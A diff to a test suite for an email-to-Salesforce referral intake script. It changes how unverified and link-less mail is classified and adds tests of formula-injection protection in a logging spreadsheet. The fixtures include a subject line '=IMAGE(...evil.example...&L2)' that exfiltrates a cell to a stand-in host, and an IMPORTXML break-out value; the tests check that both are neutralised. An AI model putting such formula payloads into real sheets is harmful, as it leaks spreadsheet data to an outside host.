@@ -288,7 +288,9 @@ function testPlentiEmptySenderNeverInternal(){
 
  // ---- 无 Plenti 链接:落 review、进 Messages 表,但不占标签 ----
  var plain=run('original-sender-missing');
- plAssertEq_(plain.state,'review','missing X-Original-Sender still lands in review — never dropped');
+ // [Q18] 无链接 = 普通流量,不需要人帮忙 → done(D-033)。"绝不静默丢弃"由下面两条守住:
+ // 状态照常落盘、Messages 表照常一整行带 reason。
+ plAssertEq_(plain.state,'done','[Q18] missing X-Original-Sender without a Plenti link is ordinary traffic — done, not review');
  plAssertEq_(plain.kind,'review','and never kind internal');
  plAssertEq_(plain.leadCandidate,false,'but with no Plenti link it does not occupy the Review label (D-027)');
  plAssertEq_(plain.scope,'out-of-scope','and is categorised as ordinary mailbox traffic');
@@ -600,6 +602,8 @@ function testPlentiRequiredProperties(){
 function testPlentiProcessFlow(){
  plTestBaseline_();
  // [D-027] 第三列是 leadCandidate(要不要占 SF-Lead-Review 标签)。
+ // [Q18] 第二列:不可信且无链接的落 done(不需要人帮忙);可信但认不出的
+ // 仍是 review —— 可信发件人发来的认不出的邮件可能是漏单,要人看。
  // 下面这些 fixture 正文里都**没有** Plenti browser-view 链接,所以一律
  // 落 review 状态但不打标签 —— 带链接的那一类在 testPlentiScopeNarrowing 里测。
  // 可信但解析不出的三条(trusted-*)是另一回事:它们通过了发件人验证,
@@ -608,14 +612,14 @@ function testPlentiProcessFlow(){
   ['trusted-referral','review',true,/Not identifiable as a Plenti referral/],
   ['trusted-noreply','review',true,/Not identifiable as a Plenti referral/],
   ['trusted-with-promo-footer','review',true,/Not identifiable as a Plenti referral/],
-  ['spoofed-plenti','review',false,/not a verified Plenti sender/],
-  ['unlisted-sender-dmarc-pass','review',false,/not a verified Plenti sender/],
-  ['auth-header-missing','review',false,/not a verified Plenti sender/],
-  ['lookalike-domain','review',false,/not a verified Plenti sender/],
-  ['suffix-domain','review',false,/not a verified Plenti sender/],
-  ['subdomain-sender','review',false,/not a verified Plenti sender/],
-  ['header-from-mismatch','review',false,/not a verified Plenti sender/],
-  ['original-sender-missing','review',false,/Sender could not be determined/]
+  ['spoofed-plenti','done',false,/not a verified Plenti sender/],
+  ['unlisted-sender-dmarc-pass','done',false,/not a verified Plenti sender/],
+  ['auth-header-missing','done',false,/not a verified Plenti sender/],
+  ['lookalike-domain','done',false,/not a verified Plenti sender/],
+  ['suffix-domain','done',false,/not a verified Plenti sender/],
+  ['subdomain-sender','done',false,/not a verified Plenti sender/],
+  ['header-from-mismatch','done',false,/not a verified Plenti sender/],
+  ['original-sender-missing','done',false,/Sender could not be determined/]
  ];
  plTestWithFakeApi_(function(calls){
   cases.forEach(function(c){
@@ -1056,6 +1060,10 @@ function testPlentiBrowserView(){
     return [];};
    var state=plProcess_(linked,false);
    plAssertEq_(state.created,true,'a fetched referral creates a Lead');
+   // [Q18] 干净建出 → done;Review 不亮,"待补联系方式"交给 SF List View(D-033)
+   plAssertEq_(state.state,'done','[Q18] a cleanly created referral goes straight to done');
+   plAssertEq_(ivLeadLabelFlags_([state]).review,false,'[Q18] and lights no Review label');
+   plAssertEq_(ivLeadLabelFlags_([state]).created,true,'but Created still lights');
    var posts=plTestPosts_(calls);
    plAssertEq_(posts.length,1,'exactly one Lead POST');
    plAssertEq_(posts[0].data.Plenti_Lead_ID__c,token,'the delivery token is stored as the external id');
@@ -1075,6 +1083,8 @@ function testPlentiBrowserView(){
    var state=plProcess_(linked,false);
    plAssertEq_(state.created,true,'a failed fetch must NOT stop the Lead from being created — the SLA clock is running');
    plAssert_(/\[DEGRADED\]/.test(state.reason),'the state says the Lead is degraded');
+   plAssertEq_(state.state,'review','[Q18] a degraded Lead is an exception — it needs a human, so review');
+   plAssertEq_(ivLeadLabelFlags_([state]).review,true,'[Q18] and Review lights');
    var posts=plTestPosts_(calls);
    plAssertEq_(posts.length,1,'still exactly one Lead');
    plAssertEq_(posts[0].data.Plenti_Lead_ID__c,token,'identity is preserved even when the page could not be read');
@@ -1662,7 +1672,9 @@ function testPlentiCreatedDurability(){
    plAssertEq_(second.created,true,'run 2: the durable flag survives a forced re-run — this is the regression');
    plAssert_(!second.createdNow,'run 2: but nothing was created this time');
    plAssertEq_(ivLeadLabelFlags_([second]).created,true,'run 2: SF-Lead-Created must STAY lit, not be removed');
-   plAssertEq_(ivLeadLabelFlags_([second]).review,true,'run 2: Review is still on — still 待补联系方式');
+   // [Q18] 同一封邮件重跑命中自己的 marker = 干净,不再亮 Review(D-033)。
+   plAssertEq_(second.state,'done','run 2: a re-run that matches its own marker is clean — done');
+   plAssertEq_(ivLeadLabelFlags_([second]).review,false,'run 2: so Review stays off');
    plAssert_(/Existing Lead matched/.test(second.reason),'run 2: the reason says it matched, not that it created');
   }finally{ivReq_=realReq;ivQuery_=realQuery;plLeadFieldMap_.cache=null;}
  });
@@ -1741,7 +1753,7 @@ function testPlentiScopeNarrowing(){
  var noise=run(make({id:'scope-noise',subject:'Invoice for August',
   headers:{'To':'eDocs <edocs@example.org>','X-Original-Sender':'accounts@supplier.example',
    'X-Original-Authentication-Results':'mx; dmarc=pass header.from=supplier.example'}}));
- plAssertEq_(noise.state,'review','ordinary traffic still lands in review state');
+ plAssertEq_(noise.state,'done','[Q18] ordinary traffic needs no human, so it is done — the state is still persisted and logged');
  plAssertEq_(noise.leadCandidate,false,'but does not occupy the Review label');
  plAssertEq_(noise.scope,'out-of-scope','categorised as out of scope');
  plAssertEq_(ivLeadLabelFlags_([noise]).review,false,'no Gmail label');
@@ -2126,7 +2138,83 @@ function testPlentiOutOfScopeState(){
  plTestClearState_();
 }
 
+// ============================================================
+// 29. [Q18] review = "脚本需要人帮忙";Messages 行的超链接与公式注入防护(D-033)
+// ============================================================
+
+function testPlentiReviewMeansHelpNeeded(){
+ plTestBaseline_();
+
+ // ---- 1. 例外清单:只有这几类落 review ----
+ var clean={confidence:'high',browserView:{conflicts:[]}};
+ plAssertEq_(plCreatedExceptions_(clean,false,true).length,0,'a clean create has no exceptions');
+ plAssert_(/\[DEGRADED\]/.test(plCreatedExceptions_({confidence:'low',browserView:{conflicts:[]}},false,true).join(' ')),'degraded');
+ plAssert_(/\[SOURCES DISAGREE: address\]/.test(plCreatedExceptions_({confidence:'high',browserView:{conflicts:['address']}},false,true).join(' ')),'source conflict');
+ plAssert_(/\[FORCED\]/.test(plCreatedExceptions_(clean,true,true).join(' ')),'forced create');
+ plAssert_(/\[RESENT/.test(plCreatedExceptions_(clean,false,false).join(' ')),
+  'a resent referral (Lead created from another message) still raises Review — D-026, unchanged by Q18');
+ plAssertEq_(plCreatedExceptions_({confidence:'high',browserView:{conflicts:[],auditMissing:true}},false,true).length,0,
+  'a missing audit copy alone is not in the approved exception list');
+ plAssertEq_(plCreatedExceptions_({confidence:'high'},false,true).length,0,'no browserView meta (forced parse) does not crash');
+
+ // ---- 2. 端到端:重发件 → review;干净的 done 不会触发任何轮询 ----
+ plTestClearState_();
+ plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(){
+  var linked=plTestMessage_('trusted-referral-with-link');
+  plTestWithFakeApi_(function(calls){
+   ivQuery_=function(q){calls.push({kind:'query',query:q});
+    return [{Id:'00Qq18000000001AAA',Description:'[Intake: some-other-message] fictional',IsConverted:false,Status:'New'}];};
+   var st=plProcess_(linked,false);
+   plAssertEq_(st.created,false,'the token hit a Lead created from another message');
+   plAssertEq_(st.state,'review','a resend is an exception');
+   plAssert_(/\[RESENT/.test(st.reason)&&/needs a human/.test(st.reason),'and the reason says why a human is needed: '+st.reason);
+  });
+ });
+ plTestClearState_();
+ var doneState={state:'done',kind:'referral',created:true,record:'00Qq18000000002AAA',leadCandidate:true,date:'2026-09-10T02:00:00.000Z'};
+ ivSave_('q18-clean',doneState);
+ plTestWithFakeApi_(function(calls){
+  plAssertEq_(plRefreshReview_(plTestMessageFrom_({id:'q18-clean'})),false,'a done Lead is not polled');
+  plAssertEq_(calls.length,0,'no SOQL is spent on clean Leads — polling covers exceptions only');
+ });
+
+ // ---- 3. Messages 行 ----
+ var realToken=ivReq_.token;
+ try{
+  ivReq_.token={access_token:'fixture',instance_url:'https://fixture.my.salesforce.example'};
+  var hostile=plTestMessageFrom_({id:'q18-row',subject:'=IMAGE("https://evil.example/?"&L2)',
+   body:'+61 fictional body that starts with a plus\n',date:'2026-09-10T02:00:00.000Z'});
+  var row=ivMessageLogRow_(hostile,'edocs@example.org',doneState,{sender:'@fictional.example'});
+  plAssertEq_(row[9],'=HYPERLINK("https://fixture.my.salesforce.example/lightning/r/Lead/00Qq18000000002AAA/view","00Qq18000000002AAA")',
+   'the SF Lead ID becomes a link, generated once at write time');
+  plAssertEq_(row[6],'created','a clean created Lead shows as created');
+  plAssertEq_(row[5].charAt(0),"'",'a subject starting with = is forced to text — never executed as a formula');
+  plAssertEq_(row[11].charAt(0),"'",'so is a body starting with +');
+  plAssertEq_(row[3].charAt(0),"'",'and a sender starting with @');
+  var formulas=row.filter(function(v){return /^[=+\-@]/.test(String(v));});
+  plAssertEq_(formulas.length,1,'the Lead link is the ONLY formula in the row');
+
+  var reviewRow=ivMessageLogRow_(hostile,'edocs@example.org',
+   {state:'review',created:true,record:'00Qq18000000003AAA',reason:'[DEGRADED] New Plenti Lead created — needs a human',date:'2026-09-10T02:00:00.000Z'},{});
+  plAssertEq_(reviewRow[6],'created + review','a created Lead that needs a human must be distinguishable from a clean one');
+
+  var outRow=ivMessageLogRow_(hostile,'edocs@example.org',
+   {state:'done',scope:'out-of-scope',reason:'Out of scope: fictional reason',date:'2026-09-10T02:00:00.000Z'},{});
+  plAssert_(/Out of scope: fictional reason/.test(outRow[10]),'a done row still carries its reason in the notes column');
+
+  plAssert_(!/^=/.test(ivLeadCell_('00Q"),IMPORTXML("x')),'a malformed id never becomes a HYPERLINK formula');
+  plAssertEq_(ivLeadCell_('=1+1'),"'=1+1",'and a malformed value starting with = is forced to text');
+  plAssertEq_(ivLeadCell_(''),'','no record, empty cell');
+  ivReq_.token={access_token:'fixture',instance_url:'https://bad".example'};
+  plAssertEq_(ivLeadCell_('00Qq18000000002AAA'),'00Qq18000000002AAA','a suspicious instance URL falls back to the plain id');
+  ivReq_.token=null;
+  plAssertEq_(ivLeadCell_('00Qq18000000002AAA'),'00Qq18000000002AAA','no Salesforce call this run → plain id, no crash');
+ }finally{ivReq_.token=realToken;}
+ plTestClearState_();
+}
+
 function runPlentiRegressionTests(){
+ testPlentiReviewMeansHelpNeeded();
  testPlentiOutOfScopeState();
  testPlentiLinkHost();
  testPlentiTwoSources();
